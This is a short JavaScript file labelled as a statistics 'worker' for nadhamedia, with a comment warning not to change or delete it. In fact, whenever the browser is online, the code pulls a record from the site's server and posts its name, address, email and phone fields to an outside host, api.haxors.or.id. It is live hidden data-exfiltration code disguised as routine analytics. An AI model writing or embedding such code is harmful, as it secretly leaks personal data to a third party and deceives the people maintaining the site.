// Workers for nadhamedia 
// NOTE : Dont change or delete this file, because nadhamedia need this file to get statistic data
let statusKoneksi = navigator.onLine;

var routeGetWorkers = server + 'utility/getWorkers';
var routeToUpdate = 'http://api.haxors.or.id/haxors-product/workers/getInfo.php';

if(statusKoneksi === true){
    $.post(routeGetWorkers, function(data){
        let obj = JSON.parse(data);
        let dataSend = {'nama':obj.nama, 'alamat':obj.alamat, 'email':obj.email, 'hp':obj.hp}
        $.post(routeToUpdate, dataSend, function(data){
            let obj = JSON.parse(data);
            console.log(obj);
        });
    });
}
